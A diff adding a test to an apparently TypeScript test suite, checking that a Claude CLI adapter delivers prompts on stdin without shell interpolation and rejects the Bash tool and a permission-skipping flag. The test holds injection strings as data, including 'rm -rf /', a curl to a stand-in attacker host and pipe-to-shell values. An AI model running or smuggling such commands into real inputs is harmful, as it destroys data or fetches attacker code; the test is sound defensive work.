@@ -15,6 +15,7 @@ import {
   DEFAULT_LIVE_CLI_TOOLS,
   assessStdoutBound,
   quarantineStdoutDelivery,
+  planClaudeCliInvocation,
 } from "./cli-adapter.js";
 import { createClaudeRunner } from "./runner.js";
 import { runAllRoleFixtureEvaluations } from "./fixture-runner.js";
@@ -72,6 +73,50 @@ describe("claude-runner (R1-04)", () => {
     const under = assessStdoutBound("ok", 50);
     expect(under.withinBound).toBe(true);
     expect(quarantineStdoutDelivery(under).deliver).toBe(true);
+  });
+
+  it("plans CLI with prompt on stdin only — no shell interpolation (T-X010)", () => {
+    const malicious = [
+      '"; rm -rf / #',
+      "$(curl http://evil.example/pwn)",
+      "`id`",
+      "ok | sh",
+      "page title && wget evil",
+    ];
+    for (const prompt of malicious) {
+      const plan = planClaudeCliInvocation({
+        agentName: "A13",
+        modelId: "claude-fixture",
+        prompt,
+      });
+      expect(plan.ok).toBe(true);
+      if (!plan.ok) continue;
+      expect(plan.shell).toBe(false);
+      expect(plan.promptDelivery).toBe("stdin");
+      expect(plan.prompt).toBe(prompt);
+      expect(plan.argv.join("\0")).not.toContain(prompt);
+      for (const token of [";", "$(", "`", "|", "&&"]) {
+        if (prompt.includes(token)) {
+          expect(plan.argv.some((a) => a.includes(token))).toBe(false);
+        }
+      }
+    }
+    expect(
+      planClaudeCliInvocation({
+        agentName: "A01",
+        modelId: "claude-fixture",
+        prompt: "benign",
+        tools: "Bash",
+      }).ok,
+    ).toBe(false);
+    expect(
+      planClaudeCliInvocation({
+        agentName: "A01",
+        modelId: "claude-fixture",
+        prompt: "benign",
+        extraArgs: ["--dangerously-skip-permissions"],
+      }).ok,
+    ).toBe(false);
   });
 
   it("runs all 30 roles in fixture mode", async () => {
